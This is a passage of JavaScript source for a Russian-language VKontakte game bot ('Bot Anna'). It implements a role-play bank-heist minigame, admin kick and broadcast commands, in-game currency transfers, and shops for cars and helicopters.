	if(vzlom.safe_st == false) { 
		return message.send(`🔑 ${rnick}, членов банды ещё не отпустили с КПЗ. \n Их выпустят через: ${unixStampLeft(vzlom.safe_status - Date.now())}`); // Лимит`);
	}
}
        // Установка статуса и кода
        vzlom.safe_status = 1;
        vzlom.safe_key = ['1111', '2222', '3333', '4444', '5555', '6666', '7777', '8888', '9999'].random();

		// Взлом
		message.send(`${rnick}, вы со своей командой пробрались в банк.`); 
		setTimeout(() => {message.send(`Пробравшись внутрь, вы проши всю систему защиты и добрались до главного сейфа банка..`) }, 1500); 
		setTimeout(() => {message.send(`Перед вами находится огромная дверь сейфа, которую просто невозможно ничем вскрыть..`) }, 2100); 
		setTimeout(() => {message.send(`Так же вы рассматривали вариант взломать сейф при помощи кода.. Но код вы не знали..`) }, 2900); 
		setTimeout(() => {message.send(`Один из членов команды вспомнил о том, что директор банка всегда ставит четырёх значный код из одинаковых цифр..`) }, 3200); 
		setTimeout(() => {message.send(` -- У вас есть лишь 1 попытка взлома.. В случае неудачи, сработает сигнализация и вас задержит полиция.. Удачи вам.
			-- Для взлома банка введите команду: Взлом [Код]`) }, 3200); 

	});


 vk.updates.hear(/^(?:вскрыть|взломать|взлом)\s?([0-9]+)?$/i, message => {
 	let user = acc.users[user_id(message.user)];
 	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
    var key = vzlom.safe_key; // Код от сейфа
    var setkey = Number(message.$match[1]); // Введённый код
    var vin = rand(1000000000,5000000000); // Найденная сумма при успешном взломе
	var shtraf = rand(5000,50000); // Штраф
	if(vzlom.safe_status != 1) return message.send(`🗝 ${rnick}, вы не начали взлом сейфа\n Для начала введите: Сейф`);
	if(!setkey) return message.send(`🗝 ${rnick}, Укажите код к сейфу.`);
	if(setkey > 9999) return message.send(`🗝 ${rnick}, Код - состоит из 4 одинаковых цифр.`);
	if(setkey < 0) return message.send(`🗝 ${rnick}, Код - состоит из 4 одинаковых цифр.`);

       // Удачный взлом взлом
       if(setkey == vzlom.safe_key) { 
       	user.balance += vin; 
       	vzlom.safe_key = false; 
       	vzlom.safe_st = true
       	vzlom.safe_status = 1;
       	message.send(`${rnick}, вы долго раздумывали кто же из челенов команды будет вводить код.\n В итоге вы выбрали инженера..`); 
       	setTimeout(() => {message.send(`Инженер подошёл к интерфейсу для ввода кода..`) }, 1500); 
       	setTimeout(() => {message.send(`В раздумии..`) }, 1900); 
       	setTimeout(() => {message.send(`Долго думая, принял решение.. начал набирать код`) }, 2900); 
       	setTimeout(() => {message.send(`Набрал на сенсорной клавиатуре комбинацию "${setkey}"..`) }, 3100); 
       	setTimeout(() => {message.send(`Активировался, интерфейс на котором начали появлятся надписи..`) }, 3100); 
       	setTimeout(() => {message.send(`[${time()}] Validation of entered data..`) }, 3100);
       	setTimeout(() => {message.send(`[${time()}] Initialization..`) }, 3700);
       	setTimeout(() => {message.send(`[${time()}] Successfully! 🔓`) }, 4500);
       	setTimeout(() => {message.send(`[${time()}] Complete shutdown of the bank security system.. 🔓`) }, 5100);
       	setTimeout(() => {message.send(`[${time()}] The door of the bank is open 🔓`) }, 5900);
       	setTimeout(() => {message.send(`Вы всей командой начали собирать деньги в мешки..`) }, 6200);
       	setTimeout(() => {message.send(`Вы смогли собрать ${rand(10,20)} мешков, которые были наполнены деньгами.`) }, 6800);
       	setTimeout(() => {message.send(`В одежде инкасации, вышли из банка под видом работкинов Инкосации банков.`) }, 7200);
       	setTimeout(() => {message.send(`Вы отправились к машине и скрылись.. Уехав на базу.`) }, 7800);
       	setTimeout(() => {message.send(`Прибыв на базу, пересчитали наглабенное, награбленной суммой оказалось ${spaces(vin)}$\n С успешным ограблением!`) }, 8500);
       	setTimeout(() => {message.send(`Спустя пару дней, по новостям обьявили что было совершено ограбление Фердерального банка.. И преступники обьявлены в федеральный розыск.`) }, 9300);
       	vzlom.safe_status = getUnix() + 7200000 

            // Неудачный взлом
        }else{
        	user.balance -= shtraf; 
        	vzlom.safe_key = false; 
        	vzlom.safe_st = false
        	vzlom.safe_status = 1;
        	message.send(`${rnick}, вы долго раздумывали кто же из челенов команды будет вводить код.\n В итоге вы выбрали инженера..`); 
        	setTimeout(() => {message.send(`Инженер подошёл к интерфейсу для ввода кода..`) }, 1500); 
        	setTimeout(() => {message.send(`В раздумии..`) }, 1900); 
        	setTimeout(() => {message.send(`Долго думая, принял решение.. начал набирать код`) }, 2900); 
        	setTimeout(() => {message.send(`Набрал на сенсорной клавиатуре комбинацию "${setkey}"..`) }, 3100); 
        	setTimeout(() => {message.send(`Активировался, интерфейс на котором начали появлятся надписи..`) }, 3100); 
        	setTimeout(() => {message.send(`[${time()}] Validation of entered data..`) }, 3100);
        	setTimeout(() => {message.send(`[${time()}] Initialization..`) }, 3700);
        	setTimeout(() => {message.send(`[${time()}] Access error! 🚫`) }, 4500);
        	setTimeout(() => {message.send(`[${time()}] Enable security! 🚫`) }, 5100);
        	setTimeout(() => {message.send(`[${time()}] Protection activated 🚫`) }, 5900);
        	setTimeout(() => {message.send(`В коридорах замагали красные серены..`) }, 6200);
        	setTimeout(() => {message.send(`Запустилась сигнализация`) }, 6800);
        	setTimeout(() => {message.send(`К банку подьехала служба безопасности..`) }, 7200);
        	setTimeout(() => {message.send(`Всех членов банды задержали и увезли в отделение.`) }, 7800);
        	setTimeout(() => {message.send(`Добросив членов банды, всех посадили на 30 суток со штрафом в ${spaces(shtraf)}$..`) }, 8500);
        	vzlom.safe_status = getUnix() + 3600000 
        }
    });














vk.updates.hear(/^(?:!kick|!кик|!кикнуть)(\s?https\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, (message) => {
	let user = acc.users[user_id(message.user)];

	if(user.level < 4) return;

	if(message.$match[4]) { 
		var domain = message.$match[4].split(" "); 
		vk.api.call("utils.resolveScreenName", { 
			screen_name: message.$match[4] 
		}).then((res) => { 
			if(res.object_id == 278877039) return message.reply('⛔  Произошла критическая ошибка системы\n -- Подсказка: Главного Администратора @id278877039 (Анну) невозможно кикать из бесед!😡');
			if(res.object_id == 287908009) return message.reply('⛔  Произошла критическая ошибка системы\n -- Подсказка: @id287908009 (Разработчика) невозможно кикать из бесед!');  
			vk.api.call("messages.removeChatUser", {chat_id: message.chatId, user_id: res.object_id })
			.catch((error) => {return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы\nВозможные причины:\n -- В данной беседе группа не Администратор\n -- @id${res.object_id} (пользователь) Администратор беседы\n -- Такого игрока нет в беседе.\n --  @id${res.object_id} (пользователь) является Основателем!`);
		});  
			message.send(`@id${user.id}(${user.prefix}), Успех!\n@id${res.object_id} (Пользователь) успешно был исключён из беседы!\n -- Вы можете вернуть @id${res.object_id} (пользователя).`);
			return message.send({sticker_id: 4653});	  
		})  
	}else{
		if(!message.$match[3]) return message.reply('⛔ Произошла критическая ошибка системы\n -- Ссылка/ID/Домен не указан, либо указан неверно.'); 
		if(message.$match[3] == 278877039) return message.reply('⛔ Произошла критическая ошибка системы\n -- Подсказка: Главного Администратора @id278877039 (Анну) невозможно кикать из бесед!😡');
		if(message.$match[3] == 287908009) return message.reply('⛔ Произошла критическая ошибка системы\n -- Подсказка: @id287908009 (Разработчика) невозможно кикнуть из бесед!'); 
		vk.api.call("messages.removeChatUser", { chat_id: message.chatId, user_id: message.$match[3] }).
		catch((error) => {return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы\nВозможные причины:\n -- В данной беседе группа не Администратор\n -- @id${message.$match[3]} (пользователь) Администратор беседы\n -- Такого игрока нет в беседе.\n --  @id${message.$match[3]} (пользователь) является Основателем!`);}); 
		message.send(`@id${user.id}(${user.prefix}), Успех!\n@id${message.$match[3]} (Пользователь) успешно был исключён из беседы!\n -- Вы можете вернуть @id${message.$match[3]} (пользователя).`);
		return message.send({sticker_id: 4653});		
	} 
});





vk.updates.hear(/^(?:!online|!онлайн)/i, (message) => { 
	let user = acc.users[user_id(message.user)];
	if(user.level < 4) return;

	vk.api.call("messages.getConversationMembers", {
		peer_id: 2000000000 + message.chatId, 
		fields: "online"
	}).then(function(res){
		let text = '';
		for(i in res.profiles){
			if(res.profiles[i].online == 1){
				text += `✓ @id${res.profiles[i].id} (${res.profiles[i].first_name} ${res.profiles[i].last_name}) ✓\n`
			}
		} 
		text += '👆🏻 Пользователи онлайн ☝🏻'
		return message.send(text)
		
	})

	function check(status){
		if(status == 1) return "online"
			if(status == 0) return "offline"
		}

});  



vk.updates.hear(/^(?:поиск|search)(\s?https\:\/\/vk\.com\/)?(id)?([0-9]+)?([^]+)?/i, (message) => {
	let user = acc.users[user_id(message.user)]; 
	if(message.$match[3]){
		var id = user_id(message.$match[3]);
		if(!acc.users[id]) return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы\n Возможные причины:\n -- Не верно указанны следующие данные: \n - ID профиля VK\n - Домен профиля VK\n - Или же сама ссылка на профиль VK\n\n -- Пользователь не онаружен в базе данных\n - Пользователь не зарегистрирован в боте.`); 
		return message.send(`
			@id${user.id}(${user.prefix}), в базе данных я обнаружила акканут: @id${message.$match[3]} (${acc.users[id].prefix})\n
			NickName игрока: ${acc.users[id].prefix}
			Профиль ВКонтакте: @id${message.$match[3]} (Перейти к профилю)
			ID Профиля ВКонтакте: ${message.$match[3]}
			ID Игрока в @bot.anya (Бот Анна): ${id}
			Пользователь является ${acc.users[id].level.toString().replace(/0/gi, "Игроком").replace(/1/gi, "VIP-Игроком").replace(/2/gi, "Модератором").replace(/3/gi, "Администратором").replace(/4/gi, "Главным Администратором").replace(/5/gi, "Основателем")} этого бота.\n -- Более подробную информацию можно узнать, написав команду: "Профиль ${id}"
			`);
	}else{ 
		if(!message.$match[4]) return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы\n -- Вы не указали: \n - ID профиля VK игрока\n - Домен профиля VK игрока\n - ссылка на профиль VK игрока`);
		var id = user_id(message.$match[3]);
		var domain = message.$match[4].split(" ");
		vk.api.call("utils.resolveScreenName", {
			screen_name: message.$match[4]
		}).then((res) => { 
			var id = user_id(res.object_id);
			if (!acc.users[id]) return message.send(`⛔ @id${user.id}(${user.prefix}), произошла критическая ошибка системы\n Возможные причины:\n -- Не верно указанны следующие данные: \n - ID профиля VK\n - Домен профиля VK\n - Или же сама ссылка на профиль VK\n\n -- Пользователь не онаружен в базе данных\n - Пользователь не зарегистрирован в боте.`);
			return message.send(`
				@id${user.id}(${user.prefix}), в базе данных я обнаружила акканут:  @id${res.object_id} (${acc.users[id].prefix})\n
				NickName игрока: ${acc.users[id].prefix}
				Профиль ВКонтакте: @id${res.object_id} (Перейти к профилю)
				ID Профиля ВКонтакте: ${res.object_id}
				ID Игрока в @bot.anya (Бот Анна): ${id}
				Пользователь является ${acc.users[id].level.toString().replace(/0/gi, "Игроком").replace(/1/gi, "VIP-Игроком").replace(/2/gi, "Модератором").replace(/3/gi, "Администратором").replace(/4/gi, "Главным Администратором").replace(/5/gi, "Основателем")} этого бота.\n -- Более подробную информацию можно узнать, написав команду: "Профиль ${id}"
				`);
		})
		return;
	}

});




vk.updates.hear(/^(?:рассылка)\s?([^]+)?/i,  message => { 

	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
	for(i in acc.users){
		vk.api.call('messages.send', {
			user_id: acc.users[i].id,
			message: `${message.$match[1]}`,
			random_id: 0
		});
	}
	return message.send(`Сообщения отправлены!`);
});


vk.updates.hear(/^(?:стикрассылка)\s?([^]+)?/i,  message => { 

	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
	for(i in acc.users){
		vk.api.call('messages.send', {
			user_id: acc.users[i].id,
			sticker_id: `${message.$match[1]}`,
						random_id: 0 //Стикер
					});
	}
	return message.send(`Стиеры успешно отправлены!`);
});

vk.updates.hear(/^(?:прассылка)\s?([^]+)?\s([^]+)?/i, (message) => {

	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
	for(i in acc.users){
		vk.api.call('messages.send', {
			user_id: acc.users[i].id,
			message: `${message.$match[1]}\n`,
			attachment: `${message.$match[2]}`,
			random_id: 0
		});
	}
	return message.send(`Посты с сообщением были успешно отправлены!`);
});


// Рассылки для беседы
        vk.updates.hear(/^(?:ch)\s?([^]+)?/i,  message => {  // сообщение

        	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
        	vk.api.call('messages.send', {
			chat_id: 1, //Беседа Бот Анна
			message: `${message.$match[1]}`,
						random_id: 0 // Сообщение
					});
        	return message.send(`Сообщение успешно отправлено в Официальную беседу @bot.anya (Бот Анна)`);
        });


         vk.updates.hear(/^(?:cp)\s?([^]+)?\s([^]+)?/i, (message) => { // сообщение и пост

         	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
         	vk.api.call('messages.send', {
			chat_id: 1, //Беседа Бот аННА
			message: `${message.$match[1]}\n`, // Сообщение
			attachment: `${message.$match[2]}`,
						random_id: 0 // Вложение
					});
         	return message.send(`Сообщение c вложением успешно отправлено в Официальную беседу @bot.anya (Бот Анна)`);
         });

                vk.updates.hear(/^(?:cmuz)\s?([^]+)?\s([^]+)?/i, (message) => { // Музыка
                	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
                	vk.api.call('messages.send', {
			chat_id: 1, //Беседа аННА
			message: `${message.$match[1]}\n`, // Сообщение
			attachment: `${message.$match[2]}`,
						random_id: 0 // Вложение
					});
                	return message.send(`Музыка успешно отправлена в Официальную беседу @bot.anya (Бот Анна)`);
                });

         vk.updates.hear(/^(?:ct)\s?([^]+)?/i,  message => { // стикер

         	if(message.user != 287908009) return message.send(`⚠ Доступ закрыт ⚠`);
         	vk.api.call('messages.send', {
			chat_id: 1, //Беседа АННА
			sticker_id: `${message.$match[1]}`,
						random_id: 0 //Стикер
					});
         	return message.send(`Стикер успешно отправлен в Официальную беседу @bot.anya (Бот Анна)`);
         });






// Рассылки для беседы 


              	        vk.updates.hear(/^(?:МузТест)/i,  (message) => { // Сама команда
              	        	let user = acc.users[user_id(message.user)]; 
              	        	if(message.user != 287908009) return  message.send(`А вот и низя)))`);
              	        	message.send(` Приветик @id${user.id}(${user.prefix}), Зайка моя 😍`)
              	        	message.send(` Я хочу сказать тебе о том....`)
              	        	message.send(` Что тест команды вложением музыки прошел успешно!!!!!`)
              	        	message.send({attachment:`photo-132550063_456240645`})
              	        	message.send({sticker_id: 33});
              	        	message.send(` А вот и обещанная музяка`)
              	        	return message.send({attachment:`audio-132550063_456239145`})
              	        });


              	        vk.updates.hear(/^(?:состав|admins)/i, message => {
              	        	let user = acc.users[user_id(message.user)];
              	        	if(user.level < 3) return;
              	        	let dev, admins, moders, vips, chat;
              	        	let devels = ``;
              	        	dev = '"Основатели"\n'; 
              	        	gl = '"Главная Администрация"\n'; 
              	        	admins = '"Администрация"\n'
              	        	moders = '"Модерация"\n'; 
              	        	vips = '\n"VIP-Пользователи"\n'; 
              	        	for (let id in acc.users) {
              	        		if(acc.users[id]){
              	        			let user = acc.users[id];

              	        			if (user.level == 5) dev += `👑 @id${acc.users[id].id}(${acc.users[id].prefix}) [${id}🆔]\n`; 
              	        			if (user.level == 4) gl += `👑 @id${acc.users[id].id}(${acc.users[id].prefix}) [${id}🆔]\n`; 
              	        			if (user.level == 3) admins += `🔹 @id${acc.users[id].id}(${acc.users[id].prefix}) [${id}🆔]\n`; 
              	        			if (user.level == 2) moders += `🔹 @id${acc.users[id].id}(${acc.users[id].prefix}) [${id}🆔]\n`; 
              	        			if (user.level == 1) vips += `🔹 @id${acc.users[id].id}(${acc.users[id].prefix}) [${id}🆔]\n`; 
              	        		}
              	        	}
              	        	let text = `\n`;
              	        	if (dev.length != 24) text += dev;
              	        	if (gl.length != 24) text += gl;
              	        	if (admins.length != 24) text += admins;  
              	        	if (moders.length != 24) text += moders;  
              	        	if (vips.length != 24) text += vips; 
              	        	return message.send(`${text}`);
              	        });






              	        vk.updates.hear(/^(?:Фулл)/i, message => { 	
              	        	let devs, admins, moders, vips, chat; 
              	        	let devels = ``;
              	        	devs = '"⛔ FULL-DOSTUP ⛔"\n';
              	        	for (let id in acc.users) {
              	        		if(acc.users[id]){
              	        			let user = acc.users[id];

              	        			if (user.full == true) devs += `📍 @id${acc.users[id].id}(${acc.users[id].prefix}) 📍\n`; 
              	        		}
              	        	}
              	        	let text = `\n`;
              	        	if (devs.length != 1000) text += devs;
              	        	return message.send(`${text}`);
              	        });



              	        vk.updates.hear(/^(?:передать)\s?([0-9]+)?\s?([0-9]+)?/i, (message) => {  
              	        	let user = acc.users[user_id(message.user)];
              	        	let id = user_id(message.user)
              	        	let ids = message.$match[1]
              	        	let args = message.$match[1];
              	        	logs(user_id(message.user), ids, message.$match[2], type = 1)

	if(message.$match[1] == 2) return message.send(`😵 Ошибка: На ваш баланс было зачислено: ${rand(1,30)}.${rand(201,821)}.${rand(403,959)}.${rand(103,999)}.${rand(303,999)}$ 😱😱`); // Наебка))
	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: Передать [ID] [Сумма].`);
	if(user.block_give == true) return message.send(`@id${user.id}(${user.prefix}), вам был заблокирован доступ к передачи средств`)
		if(user.level > 2) return message.send(`💰 @id${user.id}(${user.prefix}), Администрации запрещено передавать валюту.`)   
			if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
		if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
		if(message.$match[2] > user.balance) return message.send(`@id${user.id}(${user.prefix}), недостаточно денег 😩\n 💰 Баланс: ${user.balance}$`);

		user.balance -= Number(message.$match[2]);
		acc.users[message.$match[1]].balance += Number(message.$match[2]);

		vk.api.call("messages.send", {
			peer_id: acc.users[message.$match[1]].id,
			message: `[УВЕДОМЛЕНИЕ]\n @id${id} (${user.prefix}) перевел вам ${message.$match[2]}$!\n В ${time()} по Московскому времени.`
		}).then((res) => {}).catch((error) => {console.log('[Система]: Михаил! Я обнаружила ошибку в системе: Перевод денежных средств в команде "передать"'); });	
		return message.send(`@id${user.id}(${user.prefix}),  вы передали игроку ${acc.users[message.$match[1]].prefix} ${message.$match[2]}$. 😉`);
	});





              	        vk.updates.hear(/^(?:giv)\s?([0-9]+)?\s?([^\s  ].*)?/i,  message => {
              	        	let user = acc.users[user_id(message.user)];
              	        	let giving = Number(parserInt(message.$match[2]));
              	        	let balance = giving;
              	        	let id = user_id(message.user)
              	        	let i = config;
              	        	if(acc.users[id].level < 4) return;
              	        	if(user.block_give == true) return message.send(`@id${user.id}(${user.prefix}), вам был заблокирован доступ к команде "GIV"`)
              	        		if(!message.$match[1] || !acc.users[message.$match[1]] || !message.$match[2]) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: Пример команды: GIV [ID] [Сумма выдачи].`);
              	        	if(!Number(message.$match[1])) return message.send(`🔸 @id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Подсказка: ID Пользователя должен быть цифрового вида.`);
              	        	if(acc.users[message.$match[1]].ban == true) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n -- Аккаунт игрока ${acc.users[message.$match[1]].prefix} уже имеет перманентную блокировку\n Для разблокировки, используйте: UnPermBan ${message.$match[1]}.`);
              	        	if(!acc.users[message.$match[1]]) return message.send(`@id${user.id}(${user.prefix}), Что-то пошло не так 😱\n Пользователь не обнаружен в Базе данных.\n Подсказка: Возможно вы не правельно ввели ID Пользователя. Пожалуйста, проверьте правильность введенных данных.`);
              	        	acc.users[message.$match[1]].balance += Number(parserInt(message.$match[2]));

              	        	logs(user_id(message.user), message.$match[1], message.$match[2], type = 2)
              	        	var is = [user_id(message.user), message.text] 
              	        	adm_log(is)
              	        	return message.send(`💰 @id${user.id}(${user.prefix}), Успех! 😎\n [Система @bot.anya (Бот Анна)]: Зачисляю ироку @id${acc.users[message.$match[1]].id}(${acc.users[message.$match[1]].prefix}) - ${spaces(message.$match[2])}$\n\n Баланс игрока: ${acc.users[message.$match[1]].balance}$`);


              	        });





              	        vk.updates.hear(/^(?:бпередать)\s?([0-9]+)?\s?([0-9]+)?/i,  (message) => {  
              	        	let user = acc.users[user_id(message.user)];
              	        	let args = message.$match[1];
              	        	if(args == user_id(message.user)) return message.send(`@id${user.id}(${user.prefix}), Вы указали свой ID`)
              	        		if(user.block_pay == true) return message.send(`🔸 ➾ У вас заблокированы переводы денег.`)
              	        			if(user.level > 0) return message.send(`💰 ➾ Администрации запрещено передавать валюту.`) 

              	        				let id = user_id(message.user)
              	        			let ids = message.$match[1]
              	        			if(!message.$match[1] || !message.$match[2]) return message.send(`👉 ➾ Пример команды: бпередать ID СУММА`)
              	        				if(!Number(message.$match[1]) || !Number(message.$match[2])) return message.send(`👉 ➾ ID и СУММА должны быть числового вида.`)
              	        					if(!acc.users[message.$match[1]] || message.$match[2] < 0) return message.send(`👉 ➾ Некорректно введены данные`)
              	        						if(message.$match[2] > user.bitcoin) return message.send(`👉 ➾ У вас нет столько Биткоинов`);
              	        					user.bitcoin -= Number(message.$match[2]);
              	        					acc.users[message.$match[1]].bitcoin += Number(message.$match[2]);
              	        					logs(user_id(message.user), ids, message.$match[2], type = 1)

              	        					vk.api.call("messages.send", {
              	        						peer_id: acc.users[message.$match[1]].id,
              	        						message: `💴 ➾ Игрок [ID: ${id}] ${user.prefix} перевел вам ${message.$match[2]} bitcoins | В ${time()}`
              	        					}).then((res) => {}).catch((error) => {console.log('[Система]: Михаил! Я обнаружила ошибку в системе: Перевод денежных средств в команде "бпередать"'); });	
              	        					return message.send(`@id${user.id}(${user.prefix}), Вы успешно перевели ${acc.users[message.$match[1]].prefix} -> ${message.$match[2]} bitcoins.`);
              	        				});				 

////// Система машин
vk.updates.hear(/^(?:машины)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
 	let houses = ['Коробка', 'Подвал' , 'Палатка'] // car 
 	for(z in houses){
 		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
 	}
 if(user.house == false) return message.send(`👉 ➾ Для покупки машины Вам нужен дом!`);  
 if(!message.$match[1]){
 	return message.send(`
 		➕ 1&#8419;. Mercedes S-Class - 35.000.000$
 		➕ 2&#8419;. Volkswagen Phaeton - 45.000.000$
 		➕ 3&#8419;. Lexus LS 430 - 60.000.000$
 		➕ 4&#8419;. Skoda Rapid - 75.000.000$
 		➕ 5&#8419;. Audi A8 -  95.000.000$
 		➕ 6&#8419;. Range Rover - 119.000.000$
 		➕ 7&#8419;. BMW X6 - 120.000.000$
 		➕ 8&#8419;. Porsche Cayenne - 155.000.000$ 
 		➕ 9&#8419;. BMW 7 Series - 164.000.000$
 		➕ 1&#8419;0&#8419;. Lexus LX - 190.000.000$

 		🚘 ➾ Для покупки напишите: Машины [номер] 
 		⚠ ➾ 'В путь' отправить машину в рейс.
 		👉 ➾ Машина продать - для продажи.
 		👉 ➾ При продаже вернется 75% от суммы.
 		`)
 }
 let i = message.$match[1]; 
 let ids = [0,1,2,3,4,5,6,7,8,9,10]
 let count = [0, 35000000,45000000, 60000000,75000000,95000000,119000000,120000000,155000000,164000000,190000000];
 let names = [0, 'Mercedes S-Class','Volkswagen Phaeton','Lexus LS 430','Skoda Rapid','Audi A8','Range Rover','BMW X6','Porsche Cayenne','BMW 7 Series','Lexus LX']
 if(i < 0 || i > 10) return;
 if(user.cars != false) return message.send(`🛥 ➾ У вас уже куплена машина`);
 if(i > 0 && i <= 10){
 	if(user.balance < count[i]) return message.send(`🛥 ➾ У вас не достаточно денег.`);
 	user.balance -= count[i]; 
 	user.cars = ids[i]; 
 	return message.send(`@id${user.id}(${user.prefix}), Вы купили машину (${names[i]}) за ${count[i]}$`)
 } 
}); 

vk.updates.hear(/^(?:Ник)\s?([^]+)?/i,  (message) => { 
	let user = acc.users[user_id(message.user)];
	let rnick = (user.anick ? `@id${user.id}(${user.prefix})` : `${user.prefix}`)
	if(user.act == false) return message.send(`${rnick}, Ваш Аккаунт не активирован!\n — Для активации пиши 'Регистрация'. \n— После чего следуйте дальнейшим инструкциям.`);

	var z = /(ита|лый|кнул|кого|оим|оль)/
	let t = message.$match[1].toLowerCase();
	if(z.test(t) == true) return
		if(message.$match[1].toLowerCase() == 'вкл'){ user.anick = true; 
			return message.send(`${rnick}, гиперссылка включена! 👍`); 
		}
		if(message.$match[1].toLowerCase() == 'выкл'){ user.anick = false; 
			return message.send(`${rnick}, гиперссылка выключена! 👍`); 
		}
		if(message.$match[1].length > 15) return message.send(`${rnick}, максимальная длина ника 15 символов.`);
		message.send(`${rnick}, вы теперь: «${message.$match[1]}» 👌`);
		return user.prefix = message.$match[1];

	});

vk.updates.hear(/^(?:машина продать)/i, (message) => {
	let count = [0, 1000000,5000000, 10000000,15000000,25000000,39000000,49000000,55000000,64000000,70000000];
	let user = acc.users[user_id(message.user)];
	if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
		let sum = count[user.cars] / 100 * 75;
	user.balance += sum; 
	user.cars = false; 
	return message.send(`@id${user.id}(${user.prefix}), Вы продали свой автомобиль за ${sum}$`)
});

vk.updates.hear(/^(?:в путь)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)];
	if(user.cars == false) return message.send(`🚘 ➾ У вас нет машины`)
		if(!message.$match[1]){
			return message.send(`
				🚘 ➾  Места для отправки машины в рейс:

				1&#8419;. За город | 1ч 
				2&#8419;. В Москву | 2ч
				3&#8419;. За границу | 3ч 
				4&#8419;. На Северный полюс | 4ч 

				🚘 ➾ Вернувшись из рейса вы получите трофеи.
				🚘 ➾ Чем ценнее машина, тем лучше трофеи.
				⚠ ➾ Также, случайно может сломаться машина и она пропадет.
				`)
		}
		let i = message.$match[1]; 
		let name = [0, 'за город','в Москву','за границу','на северный полюс']
		let ids = [0,1,2,3,4]
		let time = [0,3600000,7200000,10800000,14400000]
		let times = [0,1,2,3,4]
		if(i < 0 || i > 4) return;
		if(user.reys != false) return message.send(`🚘 ➾ У вас уже отправлена машина в рейс`);
		if(i > 0 && i <= 4){   
			user.reys = true;
			message.send(`@id${user.id}(${user.prefix}), Вы отправили машину в рейс (${name[i]}) на ${times[i]} часов.`)
			if(rand(1,100) < 80){

				setTimeout(() => {
					let a = 0;
					if(i==1){a = rand(1500,5000)}
						if(i==2){a = rand(5000,9000)}
							if(i==3){a = rand(10000,15000)}
								if(i==4){a = rand(20000,30000)}
									let id_car = user.car;
								if(id_car < 3){a += rand(1000,3000)}
									if(id_car > 3 && id_car < 6){a += rand(5000,8000)}
										if(id_car > 6){a += rand(90000,12000)}
											user.reys = false;
										return message.send(`@id${user.id}(${user.prefix}), Ваша машина успешно вернулась с рейса. Вы получили: ${a}$`)
									}, time[message.$match[1]]);

			}else{
				setTimeout(() => {
					user.reys = false;
					user.cars = false;
					return message.send(`🚘 ➾ К несчастью ваша машина попала в аварию. Груз не был доставлен, машину унилизировали.`)
				}, time);
			} 

		} 
	}); 


/////// Система вертолетов/самолетов

vk.updates.hear(/^(?:вертолёты)\s?([0-9]+)?/i, (message) => {  
	let user = acc.users[user_id(message.user)]; 
	let houses = ['Коробка', 'Подвал' , 'Палатка','Домик на дереве','Полуразрушенный Дом'] // car 
	for(z in houses){
		if(user.house == houses[z]){return message.send(`👉 ➾ Ваш дом слишком дешевый, чтобы иметь данный транспорт.`)}
	}
 	if(user.house == false) return message.send(`👉 ➾ Для покупки вертолета Вам нужен дом!`); /// ДОМ НЕ НИЖЕ 5
 	if(!message.$match[1]){
 		return message.send(`
 			➕ 1&#8419;. Agusta A129 Mangusta - 15.000.000$
 			➕ 2&#8419;. Ми-24 - 25.000.000$
 			➕ 3&#8419;. AH-2 - 35.000.000$
 			➕ 4&#8419;. CAIC WZ-10 - 39.000.000$
 			➕ 5&#8419;. HAL LCH -  43.000.000$
 			➕ 6&#8419;. Eurocopter Tiger - 50.000.000$
 			➕ 7&#8419;. Ка-52 - 65.000.000$
 			➕ 8&#8419;. Apache - 80.000.000$  

 			🚁 ➾ Для покупки напишите: Вертолеты [номер] 
 			👉 ➾ Вертолет продать - для продажи.
 			👉 ➾ При продаже вернется 75% от суммы.
 			`)
 	}
 	let i = message.$match[1]; 
 	let ids = [0,1,2,3,4,5,6,7,8,9,10]
 	let count = [0, 150000000,25000000,35000000,39000000,43000000,50000000,6500000,80000000];
 	let names = [0, 'Agusta A129 Mangusta','Ми-24','AH-2','CAIC WZ-10','HAL LCH','Eurocopter Tiger','Ка-52','Apache']
 	if(i < 0 || i > 8) return;
 	if(user.helicopter != false) return message.send(`🚁 ➾ У вас уже куплен вертолет`);
 	if(i > 0 && i <= 8){
 		if(user.balance < count[i]) return message.send(`🚁 ➾ У вас не достаточно денег.`);
 		user.balance -= count[i];
 		user.helicopter = ids[i];
 		return message.send(`@id${user.id}(${user.prefix}), Вы купили вертолёт (${names[i]}) за ${count[i]}$`)
 	} 
 }); 

vk.updates.hear(/^(?:самолёты)\s?([0-9]+)?/i,(message) => {  

	let user = acc.users[user_id(message.user)];  
	let houses = ['Коробка', 'Подвал' , 'Палатка','Домик на дереве','Полуразрушенный Дом','Дом в лесу'] // car
	for(z in houses){
